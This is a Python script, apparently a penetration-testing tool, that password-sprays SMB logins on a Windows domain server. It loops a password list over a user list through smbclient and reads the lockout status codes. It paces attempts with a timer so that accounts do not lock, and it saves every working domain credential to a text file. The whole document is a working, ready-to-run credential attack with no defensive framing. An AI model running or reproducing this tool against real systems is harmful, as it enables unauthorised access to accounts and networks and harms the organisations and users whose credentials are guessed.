import subprocess
import time
import argparse
import shlex

def test_smb_login(domain, username, password, server):
    command = f'smbclient //{server}/IPC$ -U "{domain}/{username}%{password}" -c exit'
    result = subprocess.run(shlex.split(command), capture_output=True, text=True)
    if 'NT_STATUS_LOGON_FAILURE' in result.stdout:
        return False
    elif 'NT_STATUS_ACCOUNT_LOCKED_OUT' in result.stdout:
        return 'LOCKED'
    else:
        return True

def main(user_file, pass_file, domain, server, threshold, reset):
    users = [user.strip() for user in open(user_file, 'r').readlines()]
    passwords = [password.strip() for password in open(pass_file, 'r').readlines()]
    locked_users = set()
    firstPass = True
    thresholdCount = 0
    for password in passwords:
        print(f"***************{password}***************")
        for user in users:
            result = test_smb_login(domain, user, password, server)
            if result == 'LOCKED':
                if firstPass:
                    locked_users.add(user)
                    print(f"Account {user} is locked.")
                elif user not in locked_users:
                    print(f"Account {user} is locked. STOPPING.")     
                    return     
            elif result:
                print(f"Login successful: {domain}/{user}:{password}")
                # Open a file for appending
                file = open("passWordSprayOut.txt", "a")
                # Append some data to the file
                                # Append some data to the file
                file.write(f"{domain}/{user}:{password}\n")
                # Close the file
                file.close()

            else:
                print(f"Login failed: {domain}/{user}:{password}")
                                
        firstPass = False
        thresholdCount = thresholdCount + 1
        if thresholdCount >= threshold - 1:
            thresholdCount = 0
            print(f"Waiting {reset} minutes before next password attempt...")
            time.sleep((reset + 1) * 60)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='SMB password spray script.')
    parser.add_argument('-u', '--user_file', required=True, help='Path to the user file')
    parser.add_argument('-p', '--pass_file', required=True, help='Path to the password file')
    parser.add_argument('-d', '--domain', required=True, help='Domain name')
    parser.add_argument('-s', '--server', required=True, help='Server IP address')
    parser.add_argument('-t', '--threshold', type=int, default=6, help='Threshold for the number of passwords to try before resetting')
    parser.add_argument('-r', '--reset', type=int, default=10, help='Time in minutes to wait before resetting the threshold')

    args = parser.parse_args()

    main(args.user_file, args.pass_file, args.domain, args.server, args.threshold, args.reset)
